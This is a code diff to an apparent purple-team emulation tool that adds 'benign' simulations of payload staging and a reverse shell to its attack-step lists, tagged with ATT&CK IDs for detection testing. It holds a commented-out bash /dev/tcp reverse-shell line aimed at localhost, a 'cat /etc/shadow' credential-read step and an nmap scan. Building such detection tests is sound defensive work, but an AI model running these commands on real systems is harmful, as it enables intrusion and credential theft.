@@ -66,6 +66,18 @@ DEFAULT_STEPS: List[Dict[str, str]] = [
         "command": "nmap -sT -p 22,80,443 {target} --open",
         "description": "Scan for open ports.",
     },
+    {
+        "name": "Payload Staging Simulation (Benign)",
+        "technique": "T1105",
+        "command": "printf '#!/usr/bin/env bash\necho purplelab benign payload simulation\n' > " + PAYLOAD_SIM_PATH + " && chmod +x " + PAYLOAD_SIM_PATH + " && " + PAYLOAD_SIM_PATH + "",
+        "description": "Create and execute a harmless local script to simulate payload staging.",
+    },
+    {
+        "name": "Reverse Shell Attempt Simulation (Benign)",
+        "technique": "T1059.004",
+        "command": "printf '#!/usr/bin/env bash\necho purplelab reverse-shell simulation (no network action)\n# bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\n' > " + REVSHELL_SIM_PATH + " && chmod +x " + REVSHELL_SIM_PATH + " && " + REVSHELL_SIM_PATH + "",
+        "description": "Simulate reverse-shell execution patterns safely without opening outbound shell connectivity.",
+    },
 ]
 
 # Demo mode should be deterministic and tuned for likely detection signal generation.
@@ -73,10 +85,16 @@ DEMO_STEPS: List[Dict[str, str]] = [
     DEFAULT_STEPS[0],  # T1566.001 phishing-like web request
     DEFAULT_STEPS[1],  # T1071.004 deterministic DNS beacon
     {
-        "name": "Credential Access - /etc/shadow Attempt",
-        "technique": "T1003.008",
-        "command": "cat /etc/shadow",
-        "description": "Attempt to read password hashes for auditd telemetry.",
+        "name": "Payload Staging Simulation (Benign)",
+        "technique": "T1105",
+        "command": f"printf '#!/usr/bin/env bash\necho purplelab benign payload simulation\n' > {PAYLOAD_SIM_PATH} && chmod +x {PAYLOAD_SIM_PATH} && {PAYLOAD_SIM_PATH}",
+        "description": "Create and execute a harmless local script to simulate payload staging.",
+    },
+    {
+        "name": "Reverse Shell Attempt Simulation (Benign)",
+        "technique": "T1059.004",
+        "command": f"printf '#!/usr/bin/env bash\necho purplelab reverse-shell simulation (no network action)\n# bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\n' > {REVSHELL_SIM_PATH} && chmod +x {REVSHELL_SIM_PATH} && {REVSHELL_SIM_PATH}",
+        "description": "Simulate reverse-shell execution patterns safely without opening outbound shell connectivity.",
     },
     {
         "name": "Credential Access - /etc/shadow Attempt",
